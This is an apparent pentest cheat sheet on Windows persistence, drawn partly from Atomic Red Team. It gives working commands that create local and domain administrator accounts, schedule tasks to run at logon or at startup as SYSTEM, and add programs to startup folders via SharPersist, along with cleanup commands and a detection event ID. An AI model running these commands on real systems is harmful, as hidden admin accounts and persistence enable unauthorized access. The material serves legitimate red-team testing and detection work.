# Pentest

* [Persistence](#Persistence)
  * [Create account](#Create-account) 
    * [Local Account](#Local-Account) 
    * [Domain Account](#real-Domain-Account) 
  * [Task Scheduler](#real-Task-Schedule) 
  * [Startup Folder](#real-Startup-Folder) 
  * [Registry AutoRun](#real-Registry-AutoRun)
  * [COM Hijacks](#real-COM-Hijacks)
  * [WMI Event Subscriptions](#real-wmi-Event)

# Persistence
## Create account
To detect monitor event 4720: A user account was created.
### Local Account Admin
Adversaries may create a local account to maintain access to victim systems. Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

```
net user /add [*username] [password]
net localgroup administrators [username] /add
// Command to Cleanup
net user /del "#{username}" >nul 2>&1
```
### Domain Account Admin
Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. 
```
net user username password /ADD /DOMAIN 
net group "Domain Admins" username /add /domain
// Command to Cleanup
net user username >nul 2>&1 /del /domain
```
## Task Scheduler
Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.
```
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
// Cleanup
schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
```
https://atomicredteam.io/privilege-escalation/T1053.005/

## Startup Folder
Adversaries may achieve persistence by adding a program to a startup folder 

The startup folder path for the current user is: 

```C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup ```

The startup folder path for all users is: 

```C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp ```

Using tool like SharPersist:

https://github.com/mandiant/SharPersist

```SharPersist.exe -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add```


